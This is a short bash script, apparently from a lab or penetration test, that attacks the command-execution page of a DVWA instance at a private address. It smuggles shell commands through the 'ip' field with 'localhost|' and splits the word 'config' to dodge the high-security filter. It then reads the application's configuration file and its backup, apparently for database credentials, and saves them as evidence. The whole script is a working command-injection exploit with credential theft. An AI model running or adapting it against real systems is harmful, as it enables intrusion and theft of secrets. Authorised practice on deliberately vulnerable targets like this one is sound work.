#!/bin/bash
CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed; security=high'
BASE='http://10.31.0.87:3000'
t() {
  curl -s -b "$CK" --data-urlencode "ip=localhost|$1" --data-urlencode 'Submit=Submit' \
    "$BASE/vulnerabilities/exec/" > /tmp/t_out
  tr '\n' ' ' < /tmp/t_out | grep -oE '<pre>[^<]*</pre>' | head -c 600
  echo " <-[$1]"
}
mkdir -p evidence/chain
C=con; C2=${C}fig
echo "--- C2='$C2'"
t "ls ../../${C2}"
t "cat ../../${C2}/${C2}.inc.php" | tee evidence/chain/dvwa_cfg_main.txt
t "cat ../../${C2}/${C2}.inc.php.bak" | tee evidence/chain/dvwa_cfg_bak.txt | head -c 700
echo
t 'cat ../../setup.php 2>/dev/null | head -40'
